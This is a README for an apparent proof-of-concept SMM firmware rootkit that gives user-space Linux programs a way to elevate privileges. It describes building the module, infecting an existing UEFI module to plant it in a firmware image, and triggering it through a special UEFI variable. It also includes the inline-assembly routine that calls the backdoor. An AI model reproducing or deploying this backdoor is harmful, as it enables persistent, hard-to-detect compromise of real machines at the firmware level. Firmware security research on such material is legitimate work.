# Simple SMM Backdoor

This is a simple proof of concept rootkit working as a SMM module. The backdoor exposes to ring 3 applications a way to elevate privileges. Currently it supports only Linux kernel and works with the recent versions ~5.10. 

## Compiling 

The project should be compiled inside UDK 2018 and the resulting SmmBackdoor.efi file can be directly inserted inside UEFI image. The insertion process requires infecting an already existing module appending it to the last section.

## Calling rootkit

To trigger the rootkit the application is required to read a special UEFI variable created by the backdoor as a way to wake it up from sleep. Then the registers used by backdoor to read arguments should be set and the application should busy loop until RAX register value changes. The backdoor reads the arguments when the next SMI is triggered and sets RAX to 1 when it finishes.

The calling routine:
```c++
void BackdoorApi::smm_call(BackdoorApi::Params& params) const {

    if (needs_wakeup)
        do_wakeup();

    asm volatile (
        "                        \n\
            mov %6, %%rsi        \n\
            mov %7, %%rdi        \n\
            mov %8, %%rcx        \n\
            mov %9, %%rdx        \n\
            mov %10, %%r8        \n\
            mov %11, %%r9        \n\
                                 \n\
            xor %%rax, %%rax     \n\
        backdoor_loop_%=:        \n\
            test %%rax, %%rax    \n\
            jz backdoor_loop_%=  \n\
                                 \n\
            mov %%r9 , %5        \n\
            mov %%r8 , %4        \n\
            mov %%rdx, %3        \n\
            mov %%rcx, %2        \n\
            mov %%rdi, %1        \n\
            mov %%rsi, %0        \n\
        "
        :   "=g"(params.r[0]), "=g"(params.r[1]), "=g"(params.r[2]), \
            "=g"(params.r[3]), "=g"(params.r[4]), "=g"(params.r[5])
        :   "g"(params.r[0]), "g"(params.r[1]), "g"(params.r[2]),    \
            "g"(params.r[3]), "g"(params.r[4]), "g"(params.r[5])
        :    "rsi", "rdi","rcx", "rdx", "r8", "r9", "rax"
    );
}
```

